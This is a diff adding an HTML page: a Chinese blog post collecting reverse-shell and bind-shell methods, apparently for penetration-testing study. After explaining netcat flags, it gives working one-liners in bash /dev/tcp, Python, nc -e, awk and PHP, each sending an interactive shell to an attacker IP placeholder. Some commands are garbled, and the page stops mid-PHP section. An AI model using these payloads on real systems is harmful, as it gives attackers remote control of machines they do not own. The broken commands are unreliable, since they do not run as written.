@@ -1,0 +1,778 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title>关于弹shell - Sc0fie1d</title><meta name="Description" content="scofield&#39;s blog"><meta property="og:title" content="关于弹shell" />
+<meta property="og:description" content="总(ban)结(yun)来的弹shell多种手法" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://scofield1920.github.io/nc-shell/" /><meta property="og:image" content="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-11-17T00:00:00+08:00" />
+<meta property="article:modified_time" content="2023-12-17T15:38:11+08:00" /><meta property="og:site_name" content="Hugo DoIt Theme Documentation" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"/>
+
+<meta name="twitter:title" content="关于弹shell"/>
+<meta name="twitter:description" content="总(ban)结(yun)来的弹shell多种手法"/>
+<meta name="application-name" content="scofield-blog">
+<meta name="apple-mobile-web-app-title" content="scofield-blog">
+
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="http://scofield1920.github.io/nc-shell/" /><link rel="prev" href="http://scofield1920.github.io/web_vulnerabilities_fix/" /><link rel="next" href="http://scofield1920.github.io/xss-csrf_combination/" />
+<link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><meta name="google-site-verification" content="MQ8DNu27ayX6B_4ObiEDK09vGr1fdy7kOAnbd09hJk4" /><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "关于弹shell",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/scofield1920.github.io\/nc-shell\/"
+        },"image": ["http:\/\/scofield1920.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "web","wordcount":  414 ,
+        "url": "http:\/\/scofield1920.github.io\/nc-shell\/","datePublished": "2023-11-17T00:00:00+08:00","dateModified": "2023-12-17T15:38:11+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": {
+                    "@type": "ImageObject",
+                    "url": "http:\/\/scofield1920.github.io\/images\/avatar.webp",
+                    "width":  528 ,
+                    "height":  560 
+                }},"author": {
+                "@type": "Person",
+                "name": "Sc0fie1d"
+            },"description": ""
+    }
+    </script><script src="//instant.page/5.2.0" defer type="module" integrity="sha384-jnZyxPjiipYXnSU0ygqeac2q7CVYMbh84q0uHVRRxEtvFPiQYbXWUorga2aqZJ0z"></script>
+</head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme;   window.isDark = window.theme !== 'light' }
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('auto' === 'light' || 'auto' === 'dark' || 'auto' === 'black') setTheme('auto'), saveTheme('auto'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+        window.switchThemeEventSet = new Set()
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Sc0fie1d"><span class="header-title-pre"><i class='far fa-edit fa-fw'></i></span><span id="desktop-header-typeit" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/links/"> Links </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="https://github.com/scofield1920" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                    <select class="color-theme-select" id="theme-select-desktop" title="Switch Theme">
+                        <option value="light">Light</option>
+                        <option value="dark">Dark</option>
+                        <option value="black">Black</option>
+                        <option value="auto">Auto</option>
+                    </select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Sc0fie1d"><span class="header-title-pre"><i class='far fa-edit fa-fw'></i></span><span id="mobile-header-typeit" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/links/" title="">Links</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="https://github.com/scofield1920" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+                <select class="color-theme-select" id="theme-select-mobile" title="Switch Theme">
+                    <option value="light">Light</option>
+                    <option value="dark">Dark</option>
+                    <option value="black">Black</option>
+                    <option value="auto">Auto</option>
+                </select>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><div class="toc" id="toc-auto">
+        <h2 class="toc-title">Contents</h2>
+        <div class="toc-content" id="toc-content-auto"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#1nc参数">1.nc参数</a></li>
+    <li><a href="#2nc建立连接">2.nc建立连接</a>
+      <ul>
+        <li><a href="#消息共享">消息共享</a></li>
+        <li><a href="#文件传输">文件传输</a></li>
+      </ul>
+    </li>
+    <li><a href="#3正向弹shell">3.正向弹shell</a></li>
+    <li><a href="#4反向弹shell">4.反向弹shell</a>
+      <ul>
+        <li><a href="#bash版本">bash版本</a></li>
+        <li><a href="#python-反弹">python 反弹</a></li>
+        <li><a href="#nc反弹">nc反弹</a></li>
+        <li><a href="#awk反弹">awk反弹</a></li>
+        <li><a href="#php反弹">php反弹</a></li>
+        <li><a href="#perl反弹">perl反弹</a></li>
+        <li><a href="#ruby反弹">ruby反弹</a></li>
+        <li><a href="#java反弹">Java反弹</a></li>
+        <li><a href="#lua版本">lua版本</a></li>
+        <li><a href="#nc不使用-e参数反弹">nc不使用-e参数反弹</a></li>
+      </ul>
+    </li>
+    <li><a href="#5windows下反弹shell">5.Windows下反弹shell</a>
+      <ul>
+        <li><a href="#nc反弹shell"><strong>nc反弹shell</strong></a></li>
+        <li><a href="#powershell反弹"><strong>powershell反弹</strong></a></li>
+        <li><a href="#msf反弹shell"><strong>MSF反弹shell</strong></a></li>
+        <li><a href="#cobalt-strike反弹shell"><strong>Cobalt strike反弹shell</strong></a></li>
+        <li><a href="#empire反弹shell"><strong>Empire反弹shell</strong></a></li>
+        <li><a href="#nishang反弹shell"><strong>nishang反弹shell</strong></a></li>
+        <li><a href="#dnscat反弹shell"><strong>Dnscat反弹shell</strong></a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+    </div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">关于弹shell</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="/" title="Author" rel=" author" class="author">Sc0fie1d</a>
+                </span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">category <a href="/categories/web/"><i class="far fa-folder fa-fw"></i>web</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2023-11-17">2023-11-17</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2023-12-17">2023-12-17</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;414 words&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;2 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#1nc参数">1.nc参数</a></li>
+    <li><a href="#2nc建立连接">2.nc建立连接</a>
+      <ul>
+        <li><a href="#消息共享">消息共享</a></li>
+        <li><a href="#文件传输">文件传输</a></li>
+      </ul>
+    </li>
+    <li><a href="#3正向弹shell">3.正向弹shell</a></li>
+    <li><a href="#4反向弹shell">4.反向弹shell</a>
+      <ul>
+        <li><a href="#bash版本">bash版本</a></li>
+        <li><a href="#python-反弹">python 反弹</a></li>
+        <li><a href="#nc反弹">nc反弹</a></li>
+        <li><a href="#awk反弹">awk反弹</a></li>
+        <li><a href="#php反弹">php反弹</a></li>
+        <li><a href="#perl反弹">perl反弹</a></li>
+        <li><a href="#ruby反弹">ruby反弹</a></li>
+        <li><a href="#java反弹">Java反弹</a></li>
+        <li><a href="#lua版本">lua版本</a></li>
+        <li><a href="#nc不使用-e参数反弹">nc不使用-e参数反弹</a></li>
+      </ul>
+    </li>
+    <li><a href="#5windows下反弹shell">5.Windows下反弹shell</a>
+      <ul>
+        <li><a href="#nc反弹shell"><strong>nc反弹shell</strong></a></li>
+        <li><a href="#powershell反弹"><strong>powershell反弹</strong></a></li>
+        <li><a href="#msf反弹shell"><strong>MSF反弹shell</strong></a></li>
+        <li><a href="#cobalt-strike反弹shell"><strong>Cobalt strike反弹shell</strong></a></li>
+        <li><a href="#empire反弹shell"><strong>Empire反弹shell</strong></a></li>
+        <li><a href="#nishang反弹shell"><strong>nishang反弹shell</strong></a></li>
+        <li><a href="#dnscat反弹shell"><strong>Dnscat反弹shell</strong></a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>总(ban)结(yun)来的弹shell多种手法</p>
+<h2 id="1nc参数" class="headerLink">
+    <a href="#1nc%e5%8f%82%e6%95%b0" class="header-mark"></a>1.nc参数</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">(1) -l
+</span></span><span class="line"><span class="cl">用于指定nc将处于侦听模式。指定该参数，则意味着nc被当作server，侦听并接受连接，而非向其它地址发起连接。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">(2) -p &lt;port&gt;
+</span></span><span class="line"><span class="cl">指定端口，暂未用到（老版本的nc可能需要在端口号前加-p参数，下面测试环境是centos6.6，nc版本是nc-1.84，未用到-p参数）
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">(3) -s 
+</span></span><span class="line"><span class="cl">指定发送数据的源IP地址，适用于多网卡机 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">(4) -u
+</span></span><span class="line"><span class="cl">指定nc使用UDP协议，默认为TCP
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">(5) -v
+</span></span><span class="line"><span class="cl">输出交互或出错信息，新手调试时尤为有用
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">(6)-w
+</span></span><span class="line"><span class="cl">超时秒数，后面跟数字 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">(7)-z
+</span></span><span class="line"><span class="cl">表示zero，表示扫描时不发送任何数据
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">(8)-n 
+</span></span><span class="line"><span class="cl">直接使用IP地址，而不通过域名服务器；
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">(9)-e
+</span></span><span class="line"><span class="cl">执行某个程序
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>目前，默认的各个linux发行版本已经自带了netcat工具包，但是可能由于处于安全考虑原生版本的netcat带有可以直接发布与反弹本地shell的功能参数 -e 都被阉割了，所以我们需要自己手动下载二进制安装包，安装的如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">wget https://nchc.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gztar -xvzf netcat-0.7.1.tar.gz./configuremake &amp;&amp; make installmake clean
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="2nc建立连接" class="headerLink">
+    <a href="#2nc%e5%bb%ba%e7%ab%8b%e8%bf%9e%e6%8e%a5" class="header-mark"></a>2.nc建立连接</h2><h3 id="消息共享" class="headerLink">
+    <a href="#%e6%b6%88%e6%81%af%e5%85%b1%e4%ba%ab" class="header-mark"></a>消息共享</h3><p>服务端启动监听</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nc -lnvp 4444
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>客户端进行连接</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nc -nv IP 4444
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231013223623093.png" title="image-20231013223623093" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231013223623093.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231013223623093.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231013223623093.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231013223623093.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231013223623093.png 2x"
+            sizes="auto"
+            alt="image-20231013223623093">
+    </a></figure></p>
+<p>客户端与服务端实现消息共享，即客户端的输入服务端可见，服务端的输入客户端可见。</p>
+<h3 id="文件传输" class="headerLink">
+    <a href="#%e6%96%87%e4%bb%b6%e4%bc%a0%e8%be%93" class="header-mark"></a>文件传输</h3><p>和局域网聊天是原理一样的，不过把输入输出重定向到文件</p>
+<p>服务端设置监听</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">exe -lnvp 4444 &gt;recv.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>客户端发送：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nc IP 4444 &lt;1.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231013224518257.png" title="image-20231013224518257" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231013224518257.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231013224518257.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231013224518257.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231013224518257.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231013224518257.png 2x"
+            sizes="auto"
+            alt="image-20231013224518257">
+    </a></figure></p>
+<p>注：服务端和客户端都可做为接收端和发送端，发送端必须要有文件，接收端可以不创建文件，当接受端不创建文件时，会自动创建并将发送端地内容保存到文件，如果已存在文件将会覆盖其中内容</p>
+<h2 id="3正向弹shell" class="headerLink">
+    <a href="#3%e6%ad%a3%e5%90%91%e5%bc%b9shell" class="header-mark"></a>3.正向弹shell</h2><p>在服务端（靶标机）启动监听</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nc -lvvp 4444 -e /bin/bash
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在客户端（攻击机）连接</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nc IP 4444
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这种连接又称正向连接，攻击机主动连接靶标机。</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231013230045856.png" title="image-20231013230045856" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231013230045856.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231013230045856.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231013230045856.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231013230045856.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231013230045856.png 2x"
+            sizes="auto"
+            alt="image-20231013230045856">
+    </a></figure></p>
+<p>连接成功后便可执行命令。</p>
+<h2 id="4反向弹shell" class="headerLink">
+    <a href="#4%e5%8f%8d%e5%90%91%e5%bc%b9shell" class="header-mark"></a>4.反向弹shell</h2><h3 id="bash版本" class="headerLink">
+    <a href="#bash%e7%89%88%e6%9c%ac" class="header-mark"></a>bash版本</h3><p>本地作为服务端开启监听（攻击机）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nc -lvnp 4444
+</span></span><span class="line"><span class="cl">或nc -vvlp 4444
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>目标机开启反弹</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">bash -i &gt;&amp; /dev/tcp/IP/4444 0&gt;&amp;1
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">bash -i            创建一个交互式的bash shell
+</span></span><span class="line"><span class="cl">&amp;&gt;                 将标准输出和标准错误都重定向到我们指定的文件
+</span></span><span class="line"><span class="cl">/dev/tcp/IP/4444   建立连接到IP的4444端口
+</span></span><span class="line"><span class="cl">0&gt;&amp;1               将文件描述符0重定向为文件描述符1，也就是标准输入被重定向为标准输出
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231013230758727.png" title="image-20231013230758727" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231013230758727.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231013230758727.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231013230758727.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231013230758727.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231013230758727.png 2x"
+            sizes="auto"
+            alt="image-20231013230758727">
+    </a></figure></p>
+<h3 id="python-反弹" class="headerLink">
+    <a href="#python-%e5%8f%8d%e5%bc%b9" class="header-mark"></a>python 反弹</h3><p>本地作为服务器开启监听</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nc -lvvp 444
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>靶机作为客户端开启反弹</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python -c &#34;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;IP&#39;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#39;/bin/bash&#39;,&#39;-i&#39;]);&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231013231843828.png" title="image-20231013231843828" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231013231843828.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231013231843828.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231013231843828.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231013231843828.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231013231843828.png 2x"
+            sizes="auto"
+            alt="image-20231013231843828">
+    </a></figure></p>
+<p>连的时候会稍微有点慢</p>
+<h3 id="nc反弹" class="headerLink">
+    <a href="#nc%e5%8f%8d%e5%bc%b9" class="header-mark"></a>nc反弹</h3><p>本地作为服务器开启监听</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nc -lvvp 4444
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>靶标机作为客户端反弹shell</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nc -e /bin/bash IP 4444
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231013232442140.png" title="image-20231013232442140" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231013232442140.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231013232442140.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231013232442140.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231013232442140.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231013232442140.png 2x"
+            sizes="auto"
+            alt="image-20231013232442140">
+    </a></figure></p>
+<h3 id="awk反弹" class="headerLink">
+    <a href="#awk%e5%8f%8d%e5%bc%b9" class="header-mark"></a>awk反弹</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">awk &#39;BEGIN{s=&#34;/inet/tcp/0/VPS_IP/1234&#34;;for(;s|&amp;getline c;close(c))while(c|getline)print|&amp;s;close(s)}&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="php反弹" class="headerLink">
+    <a href="#php%e5%8f%8d%e5%bc%b9" class="header-mark"></a>php反弹</h3><p>本地作为服务器开启监听</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nc -lvnp 4444
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>靶标机作为客户端反弹shell</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php- &#39;exec(&#34;/bin/bash -i &gt;&amp; /dev/tcp/ip/4444&#34;)&#39;
+</span></span><span class="line"><span class="cl">或
